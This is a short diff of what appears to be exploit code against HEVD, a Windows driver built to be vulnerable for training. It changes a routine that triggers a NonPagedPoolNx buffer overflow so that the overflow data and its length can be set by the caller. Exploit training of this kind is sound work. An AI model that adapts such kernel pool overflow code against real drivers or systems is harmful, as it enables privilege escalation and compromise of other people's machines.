@@ -24,9 +24,9 @@ HANDLE HevdOpenDeviceHandle()
     return hFile;
 }
 
-int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char* overflow_chunk_buf)
+int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char* overflow_buf, size_t overflow_size)
 {
-    ULONG payload_len = 0x200 + 0x14;
+    ULONG payload_len = 0x200 + overflow_size;
 
     LPVOID input_buff = VirtualAlloc(NULL,
         payload_len + 0x1,
@@ -39,7 +39,7 @@ int HevdTriggerBufferOverflowNonPagedPoolNx(HANDLE hHevd, char* overflow_chunk_b
     }
 
     memset(input_buff, 0x41, payload_len);
-    memcpy((LPVOID)((uintptr_t)input_buff + 0x200), overflow_chunk_buf, 0x14);
+    memcpy((LPVOID)((uintptr_t)input_buff + 0x200), overflow_buf, overflow_size);
 
     printf("[*] Sending buffer of size 0x%x to HEVD\n", payload_len);
 
